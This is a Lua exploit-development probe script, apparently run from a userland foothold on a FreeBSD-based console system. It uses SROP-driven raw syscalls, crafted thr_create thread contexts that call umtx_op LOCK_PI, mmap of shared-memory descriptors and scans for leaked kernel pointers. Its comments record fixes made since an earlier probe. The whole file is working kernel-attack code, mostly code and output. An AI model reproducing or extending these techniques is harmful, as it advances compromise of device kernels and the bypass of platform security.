-- CRASH_CLASS: MODERATE
-- PROBE 142b: Fixed thr_create + PI lock from threads + SHM fd mmap
--
-- 142a failures: (1) SROP for thr_create wrong — 80a uses make_syscall directly
-- (2) arg order wrong (ctx, 0x500, tid) vs correct (ctx, tid, 0)
-- (3) GPR offsets in thr_create context may differ from SROP offsets
-- This probe: use make_syscall(430) with 80a pattern, test both GPR offset schemes

print("=== PROBE 142b: THR PI + SHM MMAP ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function q(v) return hex(v) end
local function zero(addr, len)
    for off = 0, len - 1, 4 do memory.write_dword(addr + off, 0) end
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function rq(addr) return memory.read_qword(addr) end
local function rd(addr) return to_num(memory.read_dword(addr)) end

-- Syscalls
local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_thr_create = make_syscall(430)
local sc_thr_self = make_syscall(432)
local sc_nanosleep = make_syscall(240)
local sc_mmap = make_syscall(477)
local sc_fstat = make_syscall(189)

local pid = to_num(sc20())
print("pid=" .. pid)

-- GPU heap
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x80000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))

-- Main TID
local tid_buf = memory.alloc(8)
zero(tid_buf, 8)
pcall(function() sc_thr_self(uint64(tid_buf)) end)
local main_tid = rq(tid_buf)
print("main_TID=" .. hex(main_tid))

-- Get syscall instruction address from getcontext (SROP format)
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local srop_rip = rq(srop_ctx + 0xE0)  -- SROP mc_rip at MC=0x40 + 0xA0
local srh, srl = get_hi_lo(srop_rip)
local sc_addr = uint64(string.format("0x%X%08X", srh, srl - 2))
print("sc_addr=" .. hex(sc_addr))

-- SROP helper (for non-thread syscalls)
local MC = 0x40
local ctx = srop_ctx
local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(ctx)) end)
    wq(ctx + MC + 0xA0, sc_addr)
    wq(ctx + MC + 0x38, uint64(num))
    if a1 then wq(ctx + MC + 0x08, a1) end
    if a2 then wq(ctx + MC + 0x10, a2) end
    if a3 then wq(ctx + MC + 0x18, a3) end
    if a4 then wq(ctx + MC + 0x50, a4) end
    if a5 then wq(ctx + MC + 0x28, a5) end
    if a6 then wq(ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    return rv
end

local function ua(v)
    if type(v) == "table" and v.h then
        return uint64(string.format("0x%X%08X", v.h, v.l))
    end
    return uint64(string.format("0x%X", to_num(v)))
end

-- eboot base for gadgets
local info = memory.alloc(0x200)
zero(info, 0x200)
memory.write_dword(info, 0x160)
local sc_info = make_syscall(593)
pcall(function() sc_info(uint64(0), info) end)
local txt_lo = rd(info + 0x108)
local txt_hi = rd(info + 0x10C)
local eboot = uint64(string.format("0x%X%08X", txt_hi, txt_lo))
print("eboot=" .. hex(eboot))

--------------------------------------------------------------------
-- [A] SHM fd mmap test
-- 142a found fd 21 appears after SHM_CREAT. Try to mmap it.
--------------------------------------------------------------------
print("")
print("--- [A] SHM fd mmap ---")

-- Create SHM first
local shm_key = gpu + 0x1000
memory.write_dword(shm_key, 0x41414141)
local rv_shm = srop(454, ua(shm_key), uint64(25), uint64(1), uint64(0), uint64(0))
print("[A] SHM_CREAT ret=" .. hex(rv_shm))

-- Try mmap on fds 20-25 with MAP_SHARED
for fd = 20, 25 do
    local map = srop(477, uint64(0), uint64(0x4000), uint64(3),
        uint64(1), uint64(fd), uint64(0))
    local mh, ml = get_hi_lo(map)
    if ml ~= 0xFFFFFFFF and mh ~= 0xFFFFFFFF and ml ~= 0 then
        print(string.format("[A] *** fd %d mmap SUCCESS: %s ***", fd, hex(map)))
        local ok = pcall(function() wq(map, uint64(0xDEADBEEFCAFE0001)) end)
        if ok then
            local rb = safe_rq(map)
            print("[A] write/read: " .. hex(rb))
        end
        -- Scan for kernel pointers
        for off = 0, 0x100, 8 do
            local v = safe_rq(map + off)
            if v then
                local vh, vl = get_hi_lo(v)
                if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                    print(string.format("[A] *** KPTR shm+0x%X: %s ***", off, hex(v)))
                end
            end
        end
    else
        print(string.format("[A] fd %d mmap: %s", fd, hex(map)))
    end
end

-- Also create a 2nd SHM and try
local shm_key2 = gpu + 0x1100
memory.write_dword(shm_key2, 0x42424242)
srop(454, ua(shm_key2), uint64(25), uint64(1), uint64(0), uint64(0))
for fd = 21, 30 do
    local stat_buf = gpu + 0x2000
    zero(stat_buf, 0x100)
    local rv = srop(189, uint64(fd), ua(stat_buf))
    local rvh, rvl = get_hi_lo(rv)
    if rvl == 0 and rvh == 0 then
        -- Try mmap
        local map = srop(477, uint64(0), uint64(0x4000), uint64(3),
            uint64(1), uint64(fd), uint64(0))
        local mh, ml = get_hi_lo(map)
        if ml ~= 0xFFFFFFFF and mh ~= 0xFFFFFFFF and ml ~= 0 then
            print(string.format("[A] *** fd %d (2nd) mmap SUCCESS: %s ***", fd, hex(map)))
            break
        end
    end
end
print("[A] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- [B] thr_create with LOCK_PI — GPR offset scheme A (standard FreeBSD)
-- mcontext at ctx+0x10, GPRs at standard offsets, control regs shifted
--------------------------------------------------------------------
print("")
print("--- [B] thr_create + LOCK_PI (scheme A) ---")

-- Offset scheme A: standard FreeBSD GPR layout, Sony control regs
-- Within mcontext (at ctx+0x10):
--   +0x08: mc_rdi, +0x10: mc_rsi, +0x18: mc_rdx
--   +0x28: mc_r8, +0x30: mc_r9, +0x38: mc_rax
--   +0x50: mc_r10
--   +0x80: mc_rip (verified 80a), +0x88: mc_cs, +0x90: mc_rflags
--   +0x98: mc_rsp, +0xA0: mc_ss, +0x108: mc_len
local TC = 0x10

local futex_a = gpu + 0x3000
memory.write_dword(futex_a, 0)
for off = 4, 0x20, 4 do memory.write_dword(futex_a + off, 0xDDDDDDDD) end

-- Thread stack on GPU
local stack_a = gpu + 0x10000
zero(stack_a, 0x2000)
wq(stack_a + 0x1000, uint64(0))  -- return addr = 0 → thread faults after syscall

local tctx_a = memory.alloc(0x500)
zero(tctx_a, 0x500)
-- Control regs (verified by 80a)
wq(tctx_a + TC + 0x80, sc_addr)           -- mc_rip = syscall instruction
wq(tctx_a + TC + 0x88, uint64(0x43))      -- mc_cs
wq(tctx_a + TC + 0x90, uint64(0x202))     -- mc_rflags
wq(tctx_a + TC + 0x98, ua(stack_a + 0x1000))  -- mc_rsp
wq(tctx_a + TC + 0xA0, uint64(0x3B))      -- mc_ss
wq(tctx_a + TC + 0x108, uint64(0x480))    -- mc_len
-- GPRs (scheme A: standard FreeBSD)
wq(tctx_a + TC + 0x38, uint64(454))       -- mc_rax = umtx_op
wq(tctx_a + TC + 0x08, ua(futex_a))       -- mc_rdi = futex addr
wq(tctx_a + TC + 0x10, uint64(12))        -- mc_rsi = LOCK_PI
wq(tctx_a + TC + 0x18, uint64(0))         -- mc_rdx = 0
wq(tctx_a + TC + 0x50, uint64(0))         -- mc_r10 = 0
wq(tctx_a + TC + 0x28, uint64(0))         -- mc_r8 = 0

local tid_a = memory.alloc(8)
wq(tid_a, uint64(0xDEADDEAD))

print("[B] Creating thread (scheme A)...")
local ok_a, rv_a = pcall(function()
    return sc_thr_create(uint64(tctx_a), uint64(tid_a), uint64(0))
end)
local new_tid_a = rq(tid_a)
local nah, nal = get_hi_lo(new_tid_a)
print("[B] ok=" .. tostring(ok_a) .. " rv=" .. tostring(rv_a) ..
    " tid=" .. hex(new_tid_a))

-- Wait for thread to run and die
local ts = memory.alloc(16)
wq(ts, uint64(0)); wq(ts + 8, uint64(200000000))  -- 200ms
pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)

print("[B] alive pid=" .. to_num(sc20()))
local fval_a = safe_rd(futex_a)
print("[B] futex=" .. string.format("0x%X", fval_a or 0))
if fval_a and fval_a ~= 0 then
    print("[B] *** LOCK_PI WORKED FROM THREAD! ***")
end

--------------------------------------------------------------------
-- [C] thr_create with LOCK_PI — GPR offset scheme B (80a offsets)
-- 80a defined mc_rdi at MC+0x48, mc_rax at MC+0x70 (may be wrong)
--------------------------------------------------------------------
print("")
print("--- [C] thr_create + LOCK_PI (scheme B) ---")

local futex_b = gpu + 0x4000
memory.write_dword(futex_b, 0)
for off = 4, 0x20, 4 do memory.write_dword(futex_b + off, 0xEEEEEEEE) end

local stack_b = gpu + 0x14000
zero(stack_b, 0x2000)
wq(stack_b + 0x1000, uint64(0))

local tctx_b = memory.alloc(0x500)
zero(tctx_b, 0x500)
-- Control regs (same as A)
wq(tctx_b + TC + 0x80, sc_addr)
wq(tctx_b + TC + 0x88, uint64(0x43))
wq(tctx_b + TC + 0x90, uint64(0x202))
wq(tctx_b + TC + 0x98, ua(stack_b + 0x1000))
wq(tctx_b + TC + 0xA0, uint64(0x3B))
wq(tctx_b + TC + 0x108, uint64(0x480))
-- GPRs (scheme B: 80a offsets, +0x40 shifted)
wq(tctx_b + TC + 0x70, uint64(454))       -- 80a mc_rax
wq(tctx_b + TC + 0x48, ua(futex_b))       -- 80a mc_rdi
wq(tctx_b + TC + 0x50, uint64(12))        -- 80a mc_rsi
wq(tctx_b + TC + 0x58, uint64(0))         -- 80a mc_rdx

local tid_b = memory.alloc(8)
wq(tid_b, uint64(0xDEADDEAD))

print("[C] Creating thread (scheme B)...")
local ok_b, rv_b = pcall(function()
    return sc_thr_create(uint64(tctx_b), uint64(tid_b), uint64(0))
end)
local new_tid_b = rq(tid_b)
local nbh, nbl = get_hi_lo(new_tid_b)
print("[C] ok=" .. tostring(ok_b) .. " rv=" .. tostring(rv_b) ..
    " tid=" .. hex(new_tid_b))

pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)

print("[C] alive pid=" .. to_num(sc20()))
local fval_b = safe_rd(futex_b)
print("[C] futex=" .. string.format("0x%X", fval_b or 0))
if fval_b and fval_b ~= 0 then
    print("[C] *** LOCK_PI WORKED FROM THREAD (scheme B)! ***")
end

--------------------------------------------------------------------
-- [D] thr_create with thr_exit — baseline test
-- Just verify thread creation works, thread exits cleanly
--------------------------------------------------------------------
print("")
print("--- [D] thr_exit baseline ---")

local stack_d = gpu + 0x18000
zero(stack_d, 0x2000)
wq(stack_d + 0x1000, uint64(0))

local tctx_d = memory.alloc(0x500)
zero(tctx_d, 0x500)
-- Control regs
wq(tctx_d + TC + 0x80, sc_addr)
wq(tctx_d + TC + 0x88, uint64(0x43))
wq(tctx_d + TC + 0x90, uint64(0x202))
wq(tctx_d + TC + 0x98, ua(stack_d + 0x1000))
wq(tctx_d + TC + 0xA0, uint64(0x3B))
wq(tctx_d + TC + 0x108, uint64(0x480))
-- GPRs scheme A: RAX=431 (thr_exit), RDI=0
wq(tctx_d + TC + 0x38, uint64(431))
wq(tctx_d + TC + 0x08, uint64(0))

local tid_d = memory.alloc(8)
wq(tid_d, uint64(0xDEADDEAD))

print("[D] Creating thr_exit thread (scheme A)...")
local ok_d, rv_d = pcall(function()
    return sc_thr_create(uint64(tctx_d), uint64(tid_d), uint64(0))
end)
local new_tid_d = rq(tid_d)
print("[D] ok=" .. tostring(ok_d) .. " rv=" .. tostring(rv_d) ..
    " tid=" .. hex(new_tid_d))

pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)
print("[D] alive pid=" .. to_num(sc20()))

-- Try scheme B for thr_exit
local tctx_d2 = memory.alloc(0x500)
zero(tctx_d2, 0x500)
wq(tctx_d2 + TC + 0x80, sc_addr)
wq(tctx_d2 + TC + 0x88, uint64(0x43))
wq(tctx_d2 + TC + 0x90, uint64(0x202))
wq(tctx_d2 + TC + 0x98, ua(stack_d + 0x1000))
wq(tctx_d2 + TC + 0xA0, uint64(0x3B))
wq(tctx_d2 + TC + 0x108, uint64(0x480))
-- GPRs scheme B: RAX=431 (thr_exit), RDI=0
wq(tctx_d2 + TC + 0x70, uint64(431))
wq(tctx_d2 + TC + 0x48, uint64(0))

wq(tid_d, uint64(0xDEADDEAD))
print("[D] Creating thr_exit thread (scheme B)...")
local ok_d2, rv_d2 = pcall(function()
    return sc_thr_create(uint64(tctx_d2), uint64(tid_d), uint64(0))
end)
local new_tid_d2 = rq(tid_d)
print("[D] ok=" .. tostring(ok_d2) .. " rv=" .. tostring(rv_d2) ..
    " tid=" .. hex(new_tid_d2))

pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)
print("[D] alive pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- [E] Stack residue scan after threads
--------------------------------------------------------------------
print("")
print("--- [E] Stack scan ---")
local kfound = 0
for base_off = 0x10000, 0x1A000, 0x4000 do
    for off = 0, 0x1000, 8 do
        local v = safe_rq(gpu + base_off + off)
        if v then
            local vh, vl = get_hi_lo(v)
            if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                kfound = kfound + 1
                print(string.format("[E] *** KPTR gpu+0x%X: %s ***",
                    base_off + off, hex(v)))
            end
        end
    end
end
print("[E] kptrs=" .. kfound)
print("[E] pid=" .. to_num(sc20()))
print("=== DONE ===")
